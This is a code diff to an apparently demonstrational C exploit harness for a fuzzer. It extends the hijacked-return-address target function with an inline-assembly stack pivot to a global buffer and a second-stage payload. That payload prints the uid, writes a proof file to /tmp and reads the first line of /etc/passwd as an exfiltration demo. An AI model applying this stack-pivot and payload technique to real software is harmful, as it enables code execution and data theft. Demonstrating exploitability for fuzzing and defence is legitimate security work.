@@ -17,6 +17,7 @@
 #include <string.h>
 #include <dlfcn.h>
 #include <unistd.h>
+#include <fcntl.h>
 #include <sys/wait.h>
 
 typedef int (*process_header_fn)(const unsigned char *, int);
@@ -35,24 +36,115 @@ static void build_packet(uint8_t *buf, uint16_t payload_len,
     }
 }
 
-/* The function an attacker redirects execution to */
-__attribute__((used))
+/*
+ * Fresh stack for the hijacked function.
+ * Must be a global (not on the corrupt stack).
+ */
+static char g_fresh_stack[65536] __attribute__((aligned(16)));
+
+/* int-to-decimal without libc printf (which needs TLS) */
+static int itoa_simple(int val, char *buf) {
+    if (val == 0) { buf[0] = '0'; return 1; }
+    char tmp[16];
+    int i = 0, neg = 0;
+    if (val < 0) { neg = 1; val = -val; }
+    while (val > 0) { tmp[i++] = '0' + (val % 10); val /= 10; }
+    int len = 0;
+    if (neg) buf[len++] = '-';
+    while (i > 0) buf[len++] = tmp[--i];
+    return len;
+}
+
+/*
+ * Second-stage payload: runs on the pivoted stack.
+ *
+ * Only uses write/open/read/close/getuid — these are thin syscall
+ * wrappers that work on any valid memory. Avoid printf/snprintf/
+ * system/fork which need TLS or valid pthread stack state.
+ */
+__attribute__((used, noinline))
+static void stage2(void) {
+    /* 1. Show current uid */
+    {
+        const char *m = "  uid=";
+        write(STDOUT_FILENO, m, 6);
+        char num[16];
+        int n = itoa_simple(getuid(), num);
+        write(STDOUT_FILENO, num, n);
+        write(STDOUT_FILENO, "\n", 1);
+    }
+
+    /* 2. Create proof file */
+    int fd = open("/tmp/pwned_by_fuzzgen.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd >= 0) {
+        const char *proof = "Arbitrary code execution via stack overflow.\n";
+        write(fd, proof, strlen(proof));
+        close(fd);
+        const char *m = "  Created /tmp/pwned_by_fuzzgen.txt\n";
+        write(STDOUT_FILENO, m, strlen(m));
+    }
+
+    /* 3. Read /etc/passwd first line (data exfiltration demo) */
+    fd = open("/etc/passwd", O_RDONLY);
+    if (fd >= 0) {
+        const char *m = "  /etc/passwd line 1: ";
+        write(STDOUT_FILENO, m, strlen(m));
+        char rbuf[512];
+        ssize_t r = read(fd, rbuf, sizeof(rbuf) - 1);
+        close(fd);
+        if (r > 0) {
+            for (int i = 0; i < r; i++) {
+                if (rbuf[i] == '\n') { r = i + 1; break; }
+            }
+            write(STDOUT_FILENO, rbuf, r);
+        }
+    }
+
+    const char *done = "  Arbitrary code execution demonstrated.\n\n";
+    write(STDOUT_FILENO, done, strlen(done));
+    _exit(42);
+}
+
+/*
+ * The function an attacker redirects execution to.
+ * After a return-address hijack, RBP and the stack are trashed.
+ * write() works (thin syscall), but complex libc calls need TLS.
+ * Solution: pivot RSP to a global buffer, then jump to stage2().
+ */
+__attribute__((used, noinline))
 void you_got_pwned(void) {
-    const char *msg =
+    const char *banner =
         "\n"
         "  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"
         "  !!  ARBITRARY CODE EXECUTION ACHIEVED            !!\n"
         "  !!  Attacker hijacked process_header's return     !!\n"
         "  !!  address to call this function.                !!\n"
         "  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"
-        "\n"
-        "  In a real attack, this could be:\n"
-        "    - system(\"/bin/sh\")  -> remote shell\n"
-        "    - Shellcode execution -> full machine compromise\n"
-        "    - ROP chain -> bypass DEP/NX/ASLR\n"
         "\n";
-    write(STDOUT_FILENO, msg, strlen(msg));
-    _exit(42);
+    write(STDOUT_FILENO, banner, strlen(banner));
+
+    /* Pivot to a fresh, valid stack (global buffer, not on corrupt stack)
+     * then jump to stage2 via function pointer (avoids symbol-name issues) */
+    void *sp = g_fresh_stack + sizeof(g_fresh_stack) - 128;
+    void (*fn)(void) = stage2;
+#if defined(__x86_64__)
+    __asm__ volatile (
+        "mov %0, %%rsp\n\t"
+        "mov %0, %%rbp\n\t"
+        "jmp *%1\n\t"
+        :
+        : "r"(sp), "r"(fn)
+    );
+#elif defined(__aarch64__)
+    __asm__ volatile (
+        "mov sp, %0\n\t"
+        "mov x29, %0\n\t"
+        "br %1\n\t"
+        :
+        : "r"(sp), "r"(fn)
+    );
+#endif
+    __builtin_unreachable();
 }
 
 /*
